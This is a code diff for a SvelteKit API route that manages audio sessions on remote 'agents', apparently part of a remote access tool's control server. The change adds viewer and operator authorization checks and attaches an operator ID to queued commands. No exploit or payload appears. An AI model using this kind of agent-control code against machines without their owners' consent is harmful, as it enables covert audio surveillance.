@@ -2,6 +2,7 @@ import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { audioBridgeManager, AudioBridgeError } from '$lib/server/rat/audio';
 import { registry, RegistryError } from '$lib/server/rat/store';
+import { requireOperator, requireViewer } from '$lib/server/authorization';
 import type { AudioControlCommandPayload, AudioSessionRequest } from '$lib/types/audio';
 
 function normalizeRequest(body: Record<string, unknown>): AudioSessionRequest {
@@ -29,21 +30,25 @@ function normalizeRequest(body: Record<string, unknown>): AudioSessionRequest {
 	return request;
 }
 
-export const GET: RequestHandler = ({ params }) => {
+export const GET: RequestHandler = ({ params, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	requireViewer(locals.user);
 
 	const session = audioBridgeManager.getSessionState(id);
 	return json({ session });
 };
 
-export const POST: RequestHandler = async ({ params, request }) => {
+export const POST: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	const user = requireOperator(locals.user);
 
 	let body: Record<string, unknown> = {};
 	try {
@@ -89,7 +94,7 @@ export const POST: RequestHandler = async ({ params, request }) => {
 	};
 
 	try {
-		registry.queueCommand(id, { name: 'audio-control', payload: command });
+		registry.queueCommand(id, { name: 'audio-control', payload: command }, { operatorId: user.id });
 	} catch (err) {
 		audioBridgeManager.closeSession(id, session.sessionId);
 		if (err instanceof RegistryError) {
@@ -101,11 +106,13 @@ export const POST: RequestHandler = async ({ params, request }) => {
 	return json({ session }, { status: 201 });
 };
 
-export const DELETE: RequestHandler = async ({ params, request }) => {
+export const DELETE: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	const user = requireOperator(locals.user);
 
 	let body: Record<string, unknown> = {};
 	try {
@@ -129,7 +136,7 @@ export const DELETE: RequestHandler = async ({ params, request }) => {
 	};
 
 	try {
-		registry.queueCommand(id, { name: 'audio-control', payload: command });
+		registry.queueCommand(id, { name: 'audio-control', payload: command }, { operatorId: user.id });
 	} catch (err) {
 		if (err instanceof RegistryError) {
 			throw error(err.status, err.message);
